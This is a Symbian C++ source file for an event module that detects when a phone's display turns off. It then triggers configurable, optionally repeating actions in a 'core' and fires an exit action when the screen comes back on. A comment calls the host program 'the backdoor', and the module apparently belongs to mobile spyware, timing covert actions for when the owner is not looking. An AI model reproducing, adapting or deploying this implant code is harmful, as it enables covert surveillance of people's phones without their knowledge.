/*
 * EventStandby.cpp
 *
 *  Created on: 29/set/2010
 *      Author: Giovanna
 */


#include "EventStandby.h"
#include <HAL.h>
#include <hal_data.h>
#include <e32std.h>

#include "Json.h"


CEventStandby::CEventStandby(TUint32 aTriggerId) :
	CAbstractEvent(EEvent_Standby, aTriggerId)
	{
	// No implementation required
	}

CEventStandby::~CEventStandby()
	{
	__FLOG(_L("Destructor"));
	delete iLight;
	delete iTimerRepeat;
	__FLOG(_L("End Destructor"));
	__FLOG_CLOSE;
	} 

CEventStandby* CEventStandby::NewLC(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventStandby* self = new (ELeave) CEventStandby(aTriggerId);
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CEventStandby* CEventStandby::NewL(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventStandby* self = CEventStandby::NewLC(params, aTriggerId);
	CleanupStack::Pop(); // self;
	return self;
	}

void CEventStandby::ConstructL(const TDesC8& params)
	{
	__FLOG_OPEN_ID("HT", "EventStandby.txt");
	__FLOG(_L("-------------"));
	
	BaseConstructL(params);
	
	RBuf paramsBuf;
		
	TInt err = paramsBuf.Create(2*params.Size());
	if(err == KErrNone)
		{
		paramsBuf.Copy(params);
		}
	else
		{
		//TODO: not enough memory
		}
		
	paramsBuf.CleanupClosePushL();
	CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
	CleanupStack::PushL(jsonBuilder);
	jsonBuilder->BuildFromJsonStringL(paramsBuf);
	CJsonObject* rootObject;
	jsonBuilder->GetDocumentObject(rootObject);
	if(rootObject)
		{
		CleanupStack::PushL(rootObject);
		//retrieve exit action
		if(rootObject->Find(_L("end")) != KErrNotFound)
			{
			rootObject->GetIntL(_L("end"),iStandbyParams.iExitAction);
			}
		else
			iStandbyParams.iExitAction = -1;
		//retrieve repeat action
		if(rootObject->Find(_L("repeat")) != KErrNotFound)
			{
			//action
			rootObject->GetIntL(_L("repeat"),iStandbyParams.iRepeatAction);
			//iter
			if(rootObject->Find(_L("iter")) != KErrNotFound)
				rootObject->GetIntL(_L("iter"),iStandbyParams.iIter);
			else 
				iStandbyParams.iIter = -1;
			//delay
			if(rootObject->Find(_L("delay")) != KErrNotFound)
				rootObject->GetIntL(_L("delay"),iStandbyParams.iDelay);
			else 
				iStandbyParams.iDelay = -1;
			}
		else
			{
			iStandbyParams.iRepeatAction = -1;
			iStandbyParams.iIter = -1;
			iStandbyParams.iDelay = -1;
			}
				
		//retrieve enable flag
		rootObject->GetBoolL(_L("enabled"),iEnabled);
						
		CleanupStack::PopAndDestroy(rootObject);
		}

	CleanupStack::PopAndDestroy(jsonBuilder);
	CleanupStack::PopAndDestroy(&paramsBuf);
	
	if((iStandbyParams.iRepeatAction != -1) && (iStandbyParams.iDelay != -1))
		{
		iTimerRepeat = CTimeOutTimer::NewL(*this);
		iSecondsIntervRepeat = iStandbyParams.iDelay;
		}
	else
		iTimerRepeat = NULL;
	}

void CEventStandby::StartEventL()
	{
	__FLOG(_L("StartEventL()"));
	
	iEnabled = ETrue;
	// Initialize the display value, 
	iDisplayOff = DisplayOff();
	
	// Triggering the action here could be dangerous, if the action is a sync after a new config
	// the backdoor could panic...
	if(iDisplayOff)
		{
		__FLOG(_L("DisplayOff"));
		SendActionTriggerToCoreL();
		//start repeat action
		if((iStandbyParams.iRepeatAction != -1) && (iStandbyParams.iDelay != -1))
			{
			iIter = iStandbyParams.iIter;
					
			iTimeAtRepeat.HomeTime();
			iTimeAtRepeat += iSecondsIntervRepeat;
			iTimerRepeat->RcsAt(iTimeAtRepeat);
					
			--iIter;
					
			SendActionTriggerToCoreL(iStandbyParams.iRepeatAction);
			}
		}
	else
		{
		__FLOG(_L("DisplayOn"));
		}
	
	// Start monitoring light status; it's here and not into ConstructL otherwise
	// LightStatusChanged is called before StartEventL()
	iLight = CHWRMLight::NewL(this);

	}

void CEventStandby::StopEventL()
	{
	delete iLight;
	iLight = NULL;
	iEnabled = EFalse;
	if(iTimerRepeat != NULL)
		iTimerRepeat->Cancel();
	}

TBool CEventStandby::DisplayOff()
	{
	__FLOG(_L("DisplayOff()"));
	TInt displayState;
	TInt err = KErrNone;
	err = HAL::Get( HALData::EDisplayState, displayState );
	__FLOG_1(_L("displayState = %d"),displayState);
	__FLOG_1(_L("err = %d"),err);
	if((err == KErrNone) && (displayState == 0))
		return ETrue;
	else
		return EFalse;
	}


// this is working on N96
/*
void CEventStandby::LightStatusChanged(TInt aTarget, CHWRMLight::TLightStatus aStatus)
	{
	// monitored light status change should be primary display
	if ((aTarget != CHWRMLight::EPrimaryDisplay) )
		return;
	
	switch(aStatus)
		{
		case CHWRMLight::ELightOff:
			{
			// perform HAL check
			if (DisplayOff())
				{
				// Display off
				// Before trigger the event perform an additional check, just in case.
				if (!iDisplayOff)
					{
					// Triggers the In-Action
					SendActionTriggerToCoreL();
					iDisplayOff = ETrue;
					}
				}
			}
			break;
		case CHWRMLight::ELightOn:
			{
			// perform HAL check
			if(!DisplayOff())
				{
				if(iDisplayOff)
					{
					// Triggers the  action
					if (iStandbyParams.iExitAction != 0xFFFFFFFF)
						{
						SendActionTriggerToCoreL(iStandbyParams.iExitAction);
						}
					iDisplayOff = EFalse;
							
					}
				}
			}
			break;
		default:
			break;
		}
	}
*/


// this is working on E72
void CEventStandby::LightStatusChanged(TInt aTarget, CHWRMLight::TLightStatus aStatus)
	{
	__FLOG(_L("LightStatusChanged()"));
	// perform HAL check
	if (DisplayOff())
		{
		__FLOG(_L("DisplayOff"));
		// Display off
		// Before trigger the event perform an additional check, just in case.
		if (!iDisplayOff)
			{
			__FLOG(_L("TriggerInAction"));
			iDisplayOff = ETrue;
			// Triggers the In-Action
			SendActionTriggerToCoreL();
			// Triggers the Repeat-Action
			if((iStandbyParams.iRepeatAction != -1) && (iStandbyParams.iDelay != -1))
				{
				iIter = iStandbyParams.iIter;
									
				iTimeAtRepeat.HomeTime();
				iTimeAtRepeat += iSecondsIntervRepeat;
				iTimerRepeat->RcsAt(iTimeAtRepeat);
									
				--iIter;
									
				SendActionTriggerToCoreL(iStandbyParams.iRepeatAction);
				}
			}
		}
	else 
		{
		__FLOG(_L("DisplayOn"));
		// Display on
		if(iDisplayOff)
			{
			__FLOG(_L("TriggerExitAction"));
			iDisplayOff = EFalse;
			// Stop the repeat action
			if(iTimerRepeat != NULL)
				iTimerRepeat->Cancel();
			// Triggers the  action
			if (iStandbyParams.iExitAction != -1)
				{
				SendActionTriggerToCoreL(iStandbyParams.iExitAction);
				}
							
			}
		}
	}

void CEventStandby::TimerExpiredL(TAny* /*src*/)
	{
	if(iStandbyParams.iIter == -1)
		{
		// infinite loop
		// restart timer
		iTimeAtRepeat.HomeTime();
		iTimeAtRepeat += iSecondsIntervRepeat;
		iTimerRepeat->RcsAt(iTimeAtRepeat);
		SendActionTriggerToCoreL(iStandbyParams.iRepeatAction);
		}
	else
		{
		// finite loop
		if(iIter > 0)
			{
			// still something to do
			iTimeAtRepeat.HomeTime();
			iTimeAtRepeat += iSecondsIntervRepeat;
			iTimerRepeat->RcsAt(iTimeAtRepeat);
			--iIter;
			SendActionTriggerToCoreL(iStandbyParams.iRepeatAction);
			}
		}
	}


